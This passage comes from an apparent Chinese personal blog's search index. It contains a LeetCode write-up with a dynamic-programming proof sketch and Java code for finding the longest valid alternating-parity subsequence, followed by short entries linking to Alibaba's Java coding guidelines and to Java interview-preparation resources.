<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不妨设dp数组,dp[n] dp[i]表示以nums[i]结尾的最长交错数组</span><br><span class="line">那么有</span><br><span class="line">if nums[i] % 2 == 0: dp[i] = max(dp[j] + 1 ) for j in [0,i-1] when nums[j] % 2 == 1 这个式子是很明显的</span><br><span class="line">我们接下来要证明 </span><br><span class="line">max(dp[j]) 一定是离 i 最近的 奇数。</span><br><span class="line">考虑下反证法，假设存在k&lt;j &amp;&amp; nums[k]%2== 1 &amp;&amp; dp[k] &gt; dp[j]</span><br><span class="line">(根据套路该证明dp[j] &gt; dp[k] 了)</span><br><span class="line">很明显一定有 dp[j]&gt;=dp[k]，因为对于dp[j]的子序列，我们一定可以使用dp[k]将dp[j]替换，得到相同满足条件的子序列。因此得证，nums[i] % 2 == 1 证明同理</span><br></pre></td></tr></table></figure>



<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumLength</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">         <span class="type">int</span> <span class="variable">oddCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">evenCount</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">up</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">down</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> num : nums)&#123;</span><br><span class="line">             <span class="keyword">if</span>(num % <span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">                 evenCount ++;</span><br><span class="line">                 down = up + <span class="number">1</span>;</span><br><span class="line">             &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 oddCount ++;</span><br><span class="line">                 up = down + <span class="number">1</span>;</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> Integer.max(Integer.max(oddCount, evenCount), Integer.max(up, down));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="题解思路"><a href="#题解思路" class="headerlink" title="题解思路"></a>题解思路</h4><p>讲的是更普遍的情况，下道题分析</p>
<p>参考：<a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-ii/solutions/2826591/deng-jie-zhuan-huan-dong-tai-gui-hua-pyt-z2fs/">3202. 找出有效子序列的最大长度 II - 力扣（LeetCode）</a></p>
<h3 id="3202-找出有效子序列的最大长度-II"><a href="#3202-找出有效子序列的最大长度-II" class="headerlink" title="3202. 找出有效子序列的最大长度 II"></a><a href="https://leetcode.cn/problems/find-the-maximum-length-of-valid-subsequence-ii/">3202. 找出有效子序列的最大长度 II</a></h3>]]></content>
      <tags>
        <tag>coding</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里代码规范学习</title>
    <url>/2024/06/28/%E9%98%BF%E9%87%8C%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>在线阅读链接：<a href="https://developer.aliyun.com/ebook/386/read?spm=a2c6h.26392459.ebook-detail.4.63392867ZDnuXr">https://developer.aliyun.com/ebook/386/read?spm=a2c6h.26392459.ebook-detail.4.63392867ZDnuXr</a></p>
<p>[toc]</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>面经资源整理</title>
    <url>/2024/06/28/%E9%9D%A2%E7%BB%8F%E8%B5%84%E6%BA%90%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<p><a href="https://www.xiaohongshu.com/explore/6655a3a40000000016011053?note_flow_source=wechat">后端0基础→大厂实习完整版学习路线分享✅ - 小红书 (xiaohongshu.com)</a></p>
<p><a href="https://www.nowcoder.com/discuss/551083645553954816">Java学习路线总结_牛客网 (nowcoder.com)</a></p>
<p><a href="https://xiaolincoding.com/">小林coding (xiaolincoding.com)</a></p>
<p><a href="https://javaguide.cn/home.html#java">JavaGuide（Java学习&amp;面试指南） | JavaGuide</a></p>
<p><a href="https://interviewguide.cn/">阿秀的学习笔记 (interviewguide.cn)</a></p>
<p><a href="https://github.com/viego1999/JavaWxy/blob/master/%E9%9D%A2%E8%AF%95%E8%AE%B0%E5%BD%95.md">JavaWxy&#x2F;面试记录.md at master · viego1999&#x2F;JavaWxy (github.com)</a></p>
<p>小林coding公众号</p>
<p>java基基公众号</p>
<p><a href="https://github.com/xbox1994/Java-Interview">xbox1994&#x2F;Java-Interview: 经历BAT面试后总结的【高级Java后台开发面试指南】，纯净干货无废话，针对高频面试点 (github.com)</a></p>
<p><a href="https://github.com/DreamCats/java-notes">DreamCats&#x2F;java-notes: 自己的学习笔记。包含：个人秋招经历、🐂客面经问题按照频率总结、Java一系列知识、数据库、分布式、微服务、前端、技术面试、每日文章等(持续更新) (github.com)</a></p>
]]></content>
      <tags>
        <tag>java 面经</tag>
      </tags>
  </entry>
</search>
